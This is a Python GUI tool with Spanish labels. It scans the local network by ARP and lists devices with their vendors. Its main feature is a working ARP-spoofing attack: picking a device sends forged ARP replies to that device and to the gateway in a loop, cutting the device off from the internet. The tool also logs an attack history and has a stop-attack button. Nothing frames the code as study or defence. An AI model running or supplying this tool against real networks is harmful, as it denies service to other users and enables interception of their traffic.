import tkinter as tk
from tkinter import simpledialog, messagebox, ttk, filedialog
import subprocess
import sys
import socket
import scapy.all as scapy
import requests
import time
import threading

try:
    import colorama
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'colorama'])
    import colorama
colorama.init()

class NetworkScanner:
    def __init__(self):
        self.local_ip = self.get_local_ip()
        self.subnet = self.get_subnet(self.local_ip)
        self.gateway_ip = self.get_gateway_ip()
        self.spoofing_active = False
        self.attack_history = []  # Para historial de ataques

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception as e:
            return str(e)

    def get_subnet(self, ip):
        return '.'.join(ip.split('.')[:3]) + '.0/24'

    def get_gateway_ip(self):
        try:
            result = subprocess.check_output(["ip", "route", "show", "default"]).decode().strip()
            return result.split("via ")[1].split(" ")[0]
        except Exception as e:
            return str(e)

    def scan_network(self, stop_event=None):  # Agregado stop_event para detener manualmente
        if stop_event and stop_event.is_set():
            return []
        start_time = time.time()
        devices = []
        arp_result = scapy.arping(self.subnet)
        for sent, received in arp_result[0].res:
            if stop_event and stop_event.is_set():
                break
            if received and received.haslayer(scapy.ARP) and (time.time() - start_time) < 10:
                ip = received.psrc
                mac = received.hwsrc
                devices.append((ip, mac))
        return devices

    def get_vendor(self, mac):
        try:
            response = requests.get(f"http://api.macvendors.com/{mac}")
            if response.status_code == 200:
                return response.text
            return "Desconocido"
        except:
            return "Error"

    def disconnect_internet(self, target_ip):
        try:
            gateway_mac = scapy.getmacbyip(self.gateway_ip)
            target_mac = scapy.getmacbyip(target_ip)
            local_mac = scapy.get_if_hwaddr(scapy.get_working_if())
            def spoof():
                self.spoofing_active = True
                self.attack_history.append(target_ip)  # Agregar a historial
                while self.spoofing_active:
                    packet1 = scapy.Ether(src=local_mac, dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip, hwsrc=local_mac)
                    scapy.sendp(packet1, verbose=0)
                    packet2 = scapy.Ether(src=local_mac, dst=gateway_mac) / scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=local_mac)
                    scapy.sendp(packet2, verbose=0)
                    time.sleep(2)
            thread = threading.Thread(target=spoof)
            thread.daemon = True
            thread.start()
            return True
        except Exception as e:
            messagebox.showerror("Error", str(e))
            return False

class GUIApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Network Scanner GUI")
        self.root.geometry("1200x600")
        self.root.resizable(True, True)
        self.scanner = NetworkScanner()
        self.devices = []
        self.stop_event = threading.Event()  # Para detener escaneo
        
        self.frame_top = tk.Frame(root)
        self.frame_top.pack(pady=5)
        
        self.scan_button = tk.Button(self.frame_top, text="Escanear Red", command=self.scan_network)
        self.scan_button.pack(side=tk.LEFT, padx=5)
        
        self.refresh_button = tk.Button(self.frame_top, text="Refrescar Automático", command=self.start_auto_refresh)
        self.refresh_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_scan_button = tk.Button(self.frame_top, text="Detener Escaneo", command=self.stop_scan)
        self.stop_scan_button.pack(side=tk.LEFT, padx=5)
        
        self.stats_label = tk.Label(root, text="Estadísticas: 0 dispositivos, Último escaneo: Nunca")
        self.stats_label.pack(pady=5)
        
        self.search_entry = tk.Entry(root)
        self.search_entry.pack(pady=5)
        self.search_button = tk.Button(root, text="Buscar", command=self.filter_devices)
        self.search_button.pack(pady=5)
        
        self.status_label = tk.Label(root, text="Estado: Inactivo", fg="black", bg="white")
        self.status_label.pack(pady=5, fill=tk.X)
        
        self.devices_tree = ttk.Treeview(root, columns=("IP", "MAC", "Fabricante"), show="headings")
        self.devices_tree.heading("IP", text="IP")
        self.devices_tree.heading("MAC", text="MAC")
        self.devices_tree.heading("Fabricante", text="Fabricante")
        self.devices_tree.pack(pady=5, fill=tk.BOTH, expand=True)
        
        self.frame_bottom = tk.Frame(root)
        self.frame_bottom.pack(pady=5)
        
        self.disconnect_button = tk.Button(self.frame_bottom, text="Desconectar Internet", command=self.select_device_for_disconnect)
        self.disconnect_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_attack_button = tk.Button(self.frame_bottom, text="Stop Attack", command=self.stop_attack)
        self.stop_attack_button.pack(side=tk.LEFT, padx=5)
        
        self.history_button = tk.Button(self.frame_bottom, text="Ver Historial", command=self.show_attack_history)
        self.history_button.pack(side=tk.LEFT, padx=5)
        
        self.details_button = tk.Button(self.frame_bottom, text="Ver Detalles", command=self.show_device_details)
        self.details_button.pack(side=tk.LEFT, padx=5)
        
        self.exit_button = tk.Button(self.frame_bottom, text="Salir", command=self.root.quit)
        self.exit_button.pack(side=tk.LEFT, padx=5)
    
    def scan_network(self):
        self.stop_event.clear()  # Reiniciar evento de parada
        self.devices = self.scanner.scan_network(self.stop_event)
        self.update_stats()
        self.devices.sort(key=lambda x: x[0])
        self.devices_tree.delete(*self.devices_tree.get_children())
        for i, (ip, mac) in enumerate(self.devices, 1):
            try:
                vendor = self.scanner.get_vendor(mac)
                self.devices_tree.insert('', tk.END, values=(ip, mac, vendor))
            except:
                self.devices_tree.insert('', tk.END, values=(ip, mac, "Error"))
        
    def start_auto_refresh(self):
        self.scan_network()  # Iniciar escaneo
        self.root.after(30000, self.start_auto_refresh)  # Repetir cada 30 segundos
    
    def stop_scan(self):
        self.stop_event.set()  # Detener escaneo
    
    def filter_devices(self):
        search_term = self.search_entry.get().lower()
        for item in self.devices_tree.get_children():
            self.devices_tree.delete(item)
        for i, (ip, mac) in enumerate(self.devices, 1):
            if search_term in ip.lower() or search_term in mac.lower():
                try:
                    vendor = self.scanner.get_vendor(mac)
                    self.devices_tree.insert('', tk.END, values=(ip, mac, vendor))
                except:
                    self.devices_tree.insert('', tk.END, values=(ip, mac, "Error"))
    
    def update_stats(self):
        self.stats_label.config(text=f"Estadísticas: {len(self.devices)} dispositivos, Último escaneo: {time.ctime()}")
    
    def select_device_for_disconnect(self):
        selected_item = self.devices_tree.selection()
        if selected_item:
            index = self.devices_tree.index(selected_item[0])
            if 0 <= index < len(self.devices):
                ip = self.devices[index][0]
                success = self.scanner.disconnect_internet(ip)
                if success:
                    self.update_status("Atacando dispositivo...", "red")
        else:
            messagebox.showwarning("Advertencia", "Selecciona un dispositivo primero.")
    
    def stop_attack(self):
        self.scanner.spoofing_active = False
        self.update_status("Estado: Inactivo", "black")
        messagebox.showinfo("Stop Attack", "Ataque detenido.")
    
    def show_attack_history(self):
        history_str = "\n".join(self.scanner.attack_history)
        messagebox.showinfo("Historial de Ataques", history_str if history_str else "No hay historial.")
    
    def show_device_details(self):
        selected_item = self.devices_tree.selection()
        if selected_item:
            index = self.devices_tree.index(selected_item[0])
            ip, mac = self.devices[index]
            vendor = self.scanner.get_vendor(mac)
            messagebox.showinfo("Detalles de Dispositivo", f"IP: {ip}\nMAC: {mac}\nFabricante: {vendor}")
    
    def update_status(self, message, color):
        self.status_label.config(text=message, fg=color, bg="white")

if __name__ == "__main__":
    root = tk.Tk()
    app = GUIApp(root)
    root.mainloop()
